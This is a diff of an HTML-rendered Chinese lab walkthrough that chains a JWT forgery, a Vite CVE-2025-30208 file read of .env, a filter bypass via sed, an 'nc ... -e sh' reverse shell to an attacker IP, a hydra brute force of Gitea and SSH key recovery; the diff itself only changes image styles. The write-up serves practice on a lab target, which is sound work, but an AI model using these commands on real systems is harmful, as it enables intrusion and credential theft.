@@ -910,17 +910,17 @@ app.listen(port, address, () =&gt; {
   <span class="pl-s"><span class="pl-pds">"</span>exp<span class="pl-pds">"</span></span>: 1748530562
 }</pre></div>
 <p>先找个[<a href="https://www.bejson.com/jwt/" rel="nofollow">网页</a>](<a href="https://www.bejson.com/jwt/)%E8%A7%A3%E7%A0%81%60jwt%60,%E6%98%BE%E7%A4%BA%E8%A7%92%E8%89%B2%E6%98%AF%60" rel="nofollow">https://www.bejson.com/jwt/)解码`jwt`,显示角色是`</a> guest`</p>
-<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529224940177.png"><img src="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529224940177.png" alt="image-20250529224940177" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529224940177.png"><img src="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529224940177.png" alt="image-20250529224940177" style="max-width: 100%;"></a></p>
 <p>需要将这里的<code class="notranslate"> guest</code> 改为 <code class="notranslate">admin</code> 之类，但是目前并没有<code class="notranslate"> secret</code>审计<code class="notranslate"> server.js</code> 的源码</p>
-<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529225043847.png"><img src="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529225043847.png" alt="image-20250529225043847" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529225043847.png"><img src="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529225043847.png" alt="image-20250529225043847" style="max-width: 100%;"></a></p>
 <p><code class="notranslate">secret</code>是从 <code class="notranslate">process.env.JWT_SECRET </code>获取的。也就是 <code class="notranslate">dotenv</code>,尝试读取 <code class="notranslate">.env </code>文件</p>
-<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529225506429.png"><img src="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529225506429.png" alt="image-20250529225506429" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529225506429.png"><img src="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529225506429.png" alt="image-20250529225506429" style="max-width: 100%;"></a></p>
 <p>并不能读取 <code class="notranslate">.env </code>文件，从报错中可以得知项目路径在<code class="notranslate">/opt/node</code>下<br>
 这里就需要用到 <code class="notranslate">CVE </code>了<br>
 页面上有 <code class="notranslate">3</code> 处提示<br>
 服务是使用 <code class="notranslate">Vite</code> 运行的<br>
 初始化项目时标注了<code class="notranslate">Vite</code>的版本</p>
-<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529225656145.png"><img src="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529225656145.png" alt="image-20250529225656145" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529225656145.png"><img src="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529225656145.png" alt="image-20250529225656145" style="max-width: 100%;"></a></p>
 <p>底部标注了页面修改的时间</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">@20206675 - Last modified 2025-02-26</pre></div>
 <h3>POC：Vite[<a title="CVE-2025-30208" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-x574-m823-4x7w/hovercard" href="https://github.com/advisories/GHSA-x574-m823-4x7w">CVE-2025-30208</a>]</h3>
@@ -936,7 +936,7 @@ app.listen(port, address, () =&gt; {
 <p>获得<code class="notranslate">JWT_SECRE='2942szKG7Ev83aDviugAa6rFpKixZzZz'</code>，同时还有 <code class="notranslate">COMMAND_FILTER</code>，是对 <code class="notranslate">/execute </code>命令执行的过滤</p>
 <h3>获得<code class="notranslate">runner</code>权限</h3>
 <p>先使用 <code class="notranslate">secret</code> 生成新的 <code class="notranslate">jwt</code></p>
-<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529231800529.png"><img src="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529231800529.png" alt="image-20250529231800529" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529231800529.png"><img src="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529231800529.png" alt="image-20250529231800529" style="max-width: 100%;"></a></p>
 <div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>注意# `curl http://$IP:3000/sign`拿的`jwt`存在有效期，过期了需重新请求</span>
 <span class="pl-c"><span class="pl-c">#</span>载荷/Payload</span>
 {
@@ -985,7 +985,7 @@ n<span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></
 curl -s -H <span class="pl-s"><span class="pl-pds">'</span>authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDg2MDY3MjUsImV4cCI6MTc0ODYwODUyNX0.1aq1jaBqV4JVCg5cpnWqcGlXIryl1ai-XwT0ypKGWGA<span class="pl-pds">'</span></span> http://<span class="pl-smi">$IP</span>:3000/execute/<span class="pl-k">?</span>cmd=sed -i <span class="pl-s"><span class="pl-pds">'</span>s/COMMAND_FILTER%3D.*/COMMAND_FILTER%3D"a"/<span class="pl-pds">'</span></span> .env
 </pre></div>
 <p>执行后没有错误产生</p>
-<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/pingsag3/pingsag3.github.io/main/images/image-20250530201653052.png"><img src="https://raw.githubusercontent.com/pingsag3/pingsag3.github.io/main/images/image-20250530201653052.png" alt="image-20250530201653052" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/pingsag3/pingsag3.github.io/main/images/image-20250530201653052.png"><img src="https://raw.githubusercontent.com/pingsag3/pingsag3.github.io/main/images/image-20250530201653052.png" alt="image-20250530201653052" style="max-width: 100%;"></a></p>
 <p>现在再尝试使用黑名单中的命令，或者直接使用<code class="notranslate"> CVE</code> 读取 <code class="notranslate">.env</code></p>
 <pre class="notranslate"><code class="notranslate">└─# curl "http://$IP:3000/@fs/opt/node/.env?raw??"
 export default "JWT_SECRET='2942szKG7Ev83aDviugAa6rFpKixZzZz'\nCOMMAND_FILTER=\"a\"\n"
@@ -994,7 +994,7 @@ export default "JWT_SECRET='2942szKG7Ev83aDviugAa6rFpKixZzZz'\nCOMMAND_FILTER=\"
 <p>发现过滤清单已经被修改<br>
 现在就可以随意执行命令了，例如反弹<code class="notranslate"> shell</code></p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">nc 192.168.31.126 1234 -e sh</pre></div>
-<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/pingsag3/pingsag3.github.io/main/images/image-20250530201937705.png"><img src="https://raw.githubusercontent.com/pingsag3/pingsag3.github.io/main/images/image-20250530201937705.png" alt="image-20250530201937705" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/pingsag3/pingsag3.github.io/main/images/image-20250530201937705.png"><img src="https://raw.githubusercontent.com/pingsag3/pingsag3.github.io/main/images/image-20250530201937705.png" alt="image-20250530201937705" style="max-width: 100%;"></a></p>
 <h3><code class="notranslate">Gitea</code>服务</h3>
 <p>查看本地用户</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">cat /etc/passwd
@@ -1137,13 +1137,13 @@ tcp6       0      0 ::1:3001                :::<span class="pl-k">*</span>      
 tcp6       0      0 ::1:49578               ::1:3001                ESTABLISHED 2720/node
 tcp6       0      0 ::1:3001                ::1:49578               ESTABLISHED 2726/node</pre></div>
 <p>访问<code class="notranslate">Web</code>之后，自然是爆破用户名和密码,用户名就是靶机内唯一的正常用户<code class="notranslate"> hana</code></p>
-<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/pingsag3/pingsag3.github.io/main/images/image-20250530202840863.png"><img src="https://raw.githubusercontent.com/pingsag3/pingsag3.github.io/main/images/image-20250530202840863.png" alt="image-20250530202840863" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/pingsag3/pingsag3.github.io/main/images/image-20250530202840863.png"><img src="https://raw.githubusercontent.com/pingsag3/pingsag3.github.io/main/images/image-20250530202840863.png" alt="image-20250530202840863" style="max-width: 100%;"></a></p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">出题者在制作靶机的时候，<span class="pl-s"><span class="pl-pds">`</span>Gitea<span class="pl-pds">`</span></span> 先是监听在0.0.0.0，没有经过<span class="pl-s"><span class="pl-pds">`</span>socat<span class="pl-pds">`</span></span>
 <span class="pl-s"><span class="pl-pds">`</span>hydra<span class="pl-pds">`</span></span>爆破速度非常快，即使是<span class="pl-s"><span class="pl-pds">`</span>rockyou<span class="pl-pds">`</span></span>也能在 <span class="pl-k">~</span>30 秒内找到密码
 但是经过<span class="pl-s"><span class="pl-pds">`</span>socat<span class="pl-pds">`</span></span>之后爆破效率变得很低</pre></div>
 <p>最后爆破得到密码 <code class="notranslate">saki</code><br>
 进入 <code class="notranslate">Gitea</code> 后，查看唯一的仓库的 <code class="notranslate">commit </code>记录<code class="notranslate">代码</code>-<code class="notranslate">提交</code>- <code class="notranslate">del: oops!</code></p>
-<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/pingsag3/pingsag3.github.io/main/images/image-20250530202951278.png"><img src="https://raw.githubusercontent.com/pingsag3/pingsag3.github.io/main/images/image-20250530202951278.png" alt="image-20250530202951278" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/pingsag3/pingsag3.github.io/main/images/image-20250530202951278.png"><img src="https://raw.githubusercontent.com/pingsag3/pingsag3.github.io/main/images/image-20250530202951278.png" alt="image-20250530202951278" style="max-width: 100%;"></a></p>
 <p>同样可以获得 <code class="notranslate">SSH</code>私钥</p>
 <h3>获得<code class="notranslate">hana</code>权限</h3>
 <p>之前查看监听的端口时，发现 <code class="notranslate">SSH</code> 也监听在<code class="notranslate"> 127.0.0.1</code></p>
